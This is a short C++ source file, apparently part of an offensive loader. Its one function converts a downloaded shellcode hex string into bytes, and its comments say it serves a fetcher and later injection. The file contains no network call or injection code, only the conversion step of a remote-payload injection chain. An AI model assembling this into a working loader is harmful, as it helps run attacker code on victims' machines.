// Filename: converter.cpp
// Author: slaeryan
// Version: 1.0(Alpha Release)
// Purpose: This source file contains a function to convert the 
// downloaded shellcode hex string into bytes for injection later.


#include "converter.h"

// To prep the shellcode hex string received by fetcher for injection.
// Takes the shellcode hex as input and returns a shellcode byte buffer.
unsigned char* toBytes(unsigned char *buffer) {
    const char *shellcodeHex = (const char *)buffer;
    int shellcode_length = strlen((const char *)buffer);
    unsigned char *val = (unsigned char *)calloc(shellcode_length / 2, sizeof(unsigned char));
    for (size_t count = 0; count < shellcode_length / 2; count++) {
        sscanf(shellcodeHex, "%2hhx", &val[count]);
        shellcodeHex += 2;
    }
    return val;
}